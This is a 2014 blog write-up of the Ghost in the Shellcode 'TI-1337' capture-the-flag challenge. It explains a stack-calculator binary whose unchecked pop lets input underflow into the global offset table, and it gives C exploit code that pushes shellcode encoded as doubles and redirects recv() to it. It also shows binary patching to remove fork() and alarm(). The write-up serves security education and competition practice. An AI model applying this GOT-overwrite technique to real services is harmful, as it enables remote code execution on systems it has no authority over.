---
id: 1742
title: 'Ghost in the Shellcode: TI-1337 (Pwnable 100)'
date: '2014-01-24T12:04:20-05:00'
author: ron
layout: post
guid: 'https://blog.skullsecurity.org/?p=1742'
permalink: /2014/ghost-in-the-shellcode-ti-1337-pwnable-100
categories:
    - GITS2014
    - Hacking
    - 'Reverse Engineering'
---

Hey everybody,

This past weekend was Shmoocon, and you know what that means&mdash;<a href='https://2014.ghostintheshellcode.com/'>Ghost in the Shellcode</a>!

Most years I go to Shmoocon, but this year I couldn't attend, so I did the next best thing: competed in Ghost in the Shellcode! This year, our rag-tag band of misfits&mdash;that is, the team who purposely decided not to ever decide on a team name, mainly to avoid getting competitive&mdash;managed to get 20th place out of at least 300 scoring teams!

I personally solved three levels: TI-1337, gitsmsg, and fuzzy. This is the first of three writeups, for the easiest of the three: TI-1337&mdash;solved by <a href='https://2014.ghostintheshellcode.com/solve-counts.txt'>44 teams</a>.

You can download the binary, as well as the exploit, the IDA Pro files, and everything else worth keeping that I generated, from <a href='https://github.com/iagox86/gits-2014'>my Github repository</a>.
<!--more-->
<h2>Getting started</h2>
Unlike <a href='http://broot.ca/gitsctf-pillowtalk-crypto-200'>some of my teammates</a>, I like to dive head-first into assembly, and try not to drown. So I fired up IDA Pro to see what was going on, and I immediately noticed is that it's a 64-bit Linux binary, and doesn't have a <em>ton</em> of code. Having never in my life written a 64-bit exploit, this would be an adventure!

<h2>Small aside: Fork this!</h2>

I'd like to take a quick moment to show you a trick I use to solve just about every Pwn-style CTF level: getting past that pesky fork(). Have you ever been trying to debug a vuln in a forking program? You attach  a debugger, it forks, it crashes, and you never know. So you go back, you set affinity to 'child', you debug, the debugger follows the child, catches the crash, and the socket doesn't get cleaned up properly? It's awful! There is probably a much better way to do this, but this is what I do.

First, I load the binary into IDA and look for the fork() call:

<pre>
<span class="Statement">.text</span>:<span class="Constant">00400F65</span>                         <span class="Identifier">good_connection</span>:                        <span class="Comment">; CODE XREF: do_connection_stuff+39j</span>
<span class="Statement">.text</span>:<span class="Constant">00400F65</span> <span class="Identifier">E8</span> <span class="Constant">06 </span><span class="Identifier">FD</span> <span class="Identifier">FF</span> <span class="Identifier">FF</span>     <span class="Identifier">call</span>    <span class="Identifier">_fork</span>
<span class="Statement">.text</span>:<span class="Constant">00400F6A</span> <span class="Constant">89</span> <span class="Constant">45</span> <span class="Identifier">F4</span>           <span class="Identifier">mov</span>     [<span class="Identifier">rbp</span>+<span class="Identifier">child_pid</span>], <span class="Identifier">eax</span>
<span class="Statement">.text</span>:<span class="Constant">00400F6D</span> <span class="Constant">83</span> <span class="Constant">7</span><span class="Identifier">D</span> <span class="Identifier">F4</span> <span class="Identifier">FF</span>        <span class="Identifier">cmp</span>     [<span class="Identifier">rbp</span>+<span class="Identifier">child_pid</span>], 0<span class="Identifier">FFFFFFFFh</span>
<span class="Statement">.text</span>:<span class="Constant">00400F71</span> <span class="Constant">75</span> <span class="Constant">02 </span>             <span class="Identifier">jnz</span>     <span class="Identifier">short</span> <span class="Identifier">fork_successful</span>
</pre>

You'll note that opcode bytes are turned on, so I can see the hex-encoded machine code along with the instruction. The call to fork() has the corresponding code <tt>e8 06 fd ff ff</tt>. That's what I want to get rid of.

So, I open the binary in a hex editor, such as 'xvi32.exe', search for that sequence of bytes (and perhaps some surrounding bytes, if it's ambiguous), and replace it with <tt>31 c0 90 90 90</tt>. The first two bytes&mdash;<tt>31 c0</tt>&mdash;is "xor eax, eax" (ie, clear eax), and <tt>90 90 90</tt> is "nop / nop / nop". So basically, the function does nothing and returns 0 (ie, behaves as if it's the child process).

You may want to kill the call to alarm(), as well, which will kill the process if you spend more than 30 seconds looking at it. You can replace that call with <tt>90 90 90 90 90</tt>&mdash;it doesn't matter what it returns.

I did this on all three levels, and I renamed the new executable "&lt;name&gt;-fixed". You'll find them in the Github repository. I'm not going to go over that again in the next two posts, but I'll be referring back to this instead.

<h2>The program</h2>

Since this is a post on exploitation, not reverse engineering, I'm not going to go super in-depth into the code. Instead, I'll describe it at a higher level and let you delve in more deeply if you're interested.

The main handle_connection() function can be found at offset 0x00401567. It immediately jumps to the bottom, which is a common optimization for a 'for' or 'while' loop, where it calls the code responsible for receiving data&mdash;the function at 0x00401395. After receiving data, it jumps back to the top of handle_connection() function, just after the jump to the bottom, where it goes through a big if/else list, looking for a bunch of symbols (like '+', '-', '/' and '*'&mdash;look familiar?)

After the if/else list, it goes back to the receive function, then to the top of the loop, and so on. Receive, parse, receive, parse, etc. Let's look at those two pieces separately, then we'll explore the vulnerability and see the exploit.

<h3>Receive</h3>

As I mentioned above, the receive function starts at 0x00401395.

This function starts by reading up to 0x100 (256) bytes from the socket, ending at a newline (0x0a) if it finds one. This is done using a simple receive-loop function located at 0x0040130E that is worthwhile going through, if you're new to this, but that doesn't add much to the exploit.

After reading the input, it's passed to <tt>sscanf(buffer, "%lg", ...)</tt>. The format string "%lg" tells sscanf() to parse the input as a "double" variable&mdash;a 64-bit floating point. Great: a x64 process handling floating point values; that's two things I don't know!

If the sscanf() fails&mdash;that is, the received data isn't a valid-looking floating point value&mdash;the received data is copied wholesale into the buffer. A flag at the start of the buffer is set indicating whether or not the double was parsed.

Then the function returns. Quite simple!

<h3>Processing the data</h3>

I mentioned earlier that this binary looks for mathematical symbols&mdash;'+', '-', '*', '/' in the received data. I didn't actually notice that right away, nor did the name "TI-1337" (or the fact that it used port "31415"... think about it) lead me to believe this might be a calculator. I'm not the sharpest pencil sometimes, but I try hard!

Anyway, back to the main parsing code (near the top of the function at 0x00401567 again)! The parsing code is actually divided into two parts: a short piece of code that runs if a valid double was received (ie, the sscanf() worked), and a longer one that runs if it wasn't a double. The short piece of code simply calls a function (spoiler alert: the function pushes it onto a global stack object they use, not to be confused with the runtime stack). The longer one performs a bunch of string comparisons and does soemthing based on those.

I think at this point I'll give away the trick: whole application is a stack-based calculator. It allocates a large chunk of memory as a global variable, and implements a stack (a length followed by a series of 64-bit values). If you enter a double, it's pushed onto the stack and the length is incremented. If you enter one of a few symbols, it pops one or more values (without checking if we're at the beginning!), updates the length, and performs the calculation. The new value is then pushed back on top of the stack.

Here's an example session:

<pre>
(sent) 10
(sent) 20
(sent) +
(sent) .
(received) 30
</pre>

And a list of all possible symbols:

<ul>
  <li>+ :: pops the top two elements off the stack, adds them, pushes the result</li>
  <li>- :: same as '+', except it subtracts</li>
  <li>* :: likewise, multiplication</li>
  <li>/ :: and, to round it out, division</li>
  <li>^ :: exponents</li>
  <li>! :: I never really figured this one out, might be a bitwise negation (or might not, it uses some heavy floating point opcodes that I didn't research :) )</li>
  <li>. :: display the current value</li>
  <li>b :: display the current value, and pop it</li>
  <li>q :: quit the program</li>
  <li>c :: clear the stack</li>
</ul>

And, quite honestly, that's about it! That's how it works, let's see how to break it!

<h3>The vulnerability</h3>

As I alluded to earlier, the program fails to check where on the stack it currently is when it pops a value. That means, if you pop a value when there's nothing on the stack, you wind up with a buffer underflow. Oops! That means that if we pop a bunch of times then push, it's going to overwrite something before the beginning of the stack.

So where is the stack? If you look at the code in IDA, you'll find that the stack starts at 0x00603140&mdash;the .bss section. If you scroll up, before long you'll find this:

<pre>
<span class="Statement">.got.plt</span>:<span class="Constant">0060301</span><span class="Constant">8</span> <span class="Identifier">off_603018</span>      <span class="Identifier">dq</span> <span class="Identifier">offset</span> <span class="Identifier">free</span>          <span class="Comment">; DATA XREF: _freer</span>
<span class="Statement">.got.plt</span>:<span class="Constant">00603020</span> <span class="Identifier">off_603020</span>      <span class="Identifier">dq</span> <span class="Identifier">offset</span> <span class="Identifier">recv</span>          <span class="Comment">; DATA XREF: _recvr</span>
<span class="Statement">.got.plt</span>:<span class="Constant">0060302</span><span class="Constant">8</span> <span class="Identifier">off_603028</span>      <span class="Identifier">dq</span> <span class="Identifier">offset</span> <span class="Identifier">strncpy</span>       <span class="Comment">; DATA XREF: _strncpyr</span>
<span class="Statement">.got.plt</span>:<span class="Constant">00603030</span> <span class="Identifier">off_603030</span>      <span class="Identifier">dq</span> <span class="Identifier">offset</span> <span class="Identifier">setsockopt</span>    <span class="Comment">; DATA XREF: _setsockoptr</span>
...
</pre>

The global offset table! And it's readable/writeable!

If we pop a couple dozen times, then push a value of our choice, we can overwrite any entry&mdash;or all entries&mdash;with any value we want!

That just leaves one last step: where to put the shellcode?

<h3>Aside: floating point</h3>

One gotcha that's probably uninteresting, but is also the reason that this level took me significantly longer than it should have&mdash;the only thing you can push/pop on the application's stack is 64-bit double values! They're read using "%lg", but if I print stuff out using <tt>printf("%lg", address)</tt>, it would truncate the numbers! Boo!

After some googling, I discovered that you had to raise printf's precision a whole bunch to reproduce the full 64-bit value as a decimal number. I decided that 127 decimal places was more than enough (probably like 5x too much, but I don't even care) to get a good result, so I used this to convert a series of 8 bytes to a unique double:

<pre>
  sprintf(buf, <span class="Constant">&quot;</span><span class="Special">%.127lg</span><span class="Special">\n</span><span class="Constant">&quot;</span>, d);                                
</pre>

I incorporated that into my push() function:

<pre>
<span class="Comment">/*</span><span class="Comment"> This pushes an 8-byte value onto the server's stack. </span><span class="Comment">*/</span>
<span class="Type">void</span> do_push(<span class="Type">int</span> s, <span class="Type">char</span> *value)
{
  <span class="Type">char</span> buf[<span class="Constant">1024</span>];
  <span class="Type">double</span> d;

  <span class="Comment">/*</span><span class="Comment"> Convert the value to a double </span><span class="Comment">*/</span>
  memcpy(&amp;d, value, <span class="Constant">8</span>);

  <span class="Comment">/*</span><span class="Comment"> Turn the double into a string </span><span class="Comment">*/</span>
  sprintf(buf, <span class="Constant">&quot;</span><span class="Special">%.127lg</span><span class="Special">\n</span><span class="Constant">&quot;</span>, d);
  printf(<span class="Constant">&quot;Pushing </span><span class="Special">%s</span><span class="Constant">&quot;</span>, buf);

  <span class="Comment">/*</span><span class="Comment"> Send it </span><span class="Comment">*/</span>
  <span class="Identifier">if</span>(send(s, buf, strlen(buf), <span class="Constant">0</span>) != strlen(buf))
    perror(<span class="Constant">&quot;send error!&quot;</span>);
}
</pre>

And it worked perfectly!

<h3>The exploit</h3>

Well, we have a stack (one again, not to be confused with the program's stack) where we can put shellcode. It has a static memory address and is user-controllable. We also have a way to encode the shellcode (and addresses) so we wind up with fully controlled values on the stack. Let's write an exploit!

Here's the bulk of the exploit:

<pre>
<span class="Type">int</span> main(<span class="Type">int</span> argc, <span class="Type">const</span> <span class="Type">char</span> *argv[])
{
  <span class="Type">char</span> buf[<span class="Constant">1024</span>];
  <span class="Type">int</span> i;

  <span class="Type">int</span> s = get_socket();

  <span class="Comment">/*</span><span class="Comment"> Load the shellcode </span><span class="Comment">*/</span>
  <span class="Statement">for</span>(i = <span class="Constant">0</span>; i &lt; strlen(shellcode); i += <span class="Constant">8</span>)
    do_push(s, shellcode + i);
  <span class="Comment">/*</span><span class="Comment"> Pop the shellcode (in retrospect, this could be replaced with a single 'c') </span><span class="Comment">*/</span>
  <span class="Statement">for</span>(i = <span class="Constant">0</span>; i &lt; strlen(shellcode); i += <span class="Constant">8</span>)
    do_pop(s);

  <span class="Comment">/*</span><span class="Comment"> Pop until we're at the recv() call </span><span class="Comment">*/</span>
  <span class="Statement">for</span>(i = <span class="Constant">0</span>; i &lt; <span class="Constant">38</span>; i++)
    do_pop(s);

  do_push(s, TARGET);

  <span class="Comment">/*</span><span class="Comment"> Send a '.' just so I can catch it </span><span class="Comment">*/</span>
  sprintf(buf, <span class="Constant">&quot;.</span><span class="Special">\n</span><span class="Constant">&quot;</span>);
  send(s, buf, strlen(buf), <span class="Constant">0</span>);

  sleep(<span class="Constant">100</span>);

  <span class="Statement">return</span> <span class="Constant">0</span>;
}
</pre>

You can find the full exploit <a href='https://github.com/iagox86/gits-2014/blob/master/ti-1337/sploit.c'>here</a>!

<h2>Conclusion</h2>

And that's all there is to it! Just push the shellcode on the stack, pop our way back to the .got.plt section, and push the address of the stack. Bam! Execution!

That's all for now, stay tuned for the much more difficult levels: gitsmsg and fuzzy!